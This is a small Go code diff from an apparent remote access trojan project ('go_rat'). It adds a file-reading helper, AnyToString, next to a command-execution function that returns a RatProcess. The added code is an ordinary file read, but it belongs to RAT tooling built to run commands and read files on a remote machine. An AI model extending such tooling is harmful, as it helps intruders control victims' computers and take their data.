@@ -6,6 +6,7 @@ package Core
 
 import (
 	"go_rat/pkg/shared_code/ErrorHandling"
+	"io/ioutil"
 	"os"
 )
 
@@ -29,6 +30,15 @@ func exec_command(command_struct *Command) *RatProcess {
 		Process: herp,
 	}
 	return &new_process
+}
+
+func AnyToString(filename string) (string, error) {
+	filebuffer, derp := ioutil.ReadFile(filename)
+	if derp != nil {
+		ErrorHandling.RatLogError(derp, "[-] ERROR: Cannot Convert Data Object to String")
+	}
+	fileasstring := string(filebuffer)
+	return fileasstring, derp
 }
 
 /*/
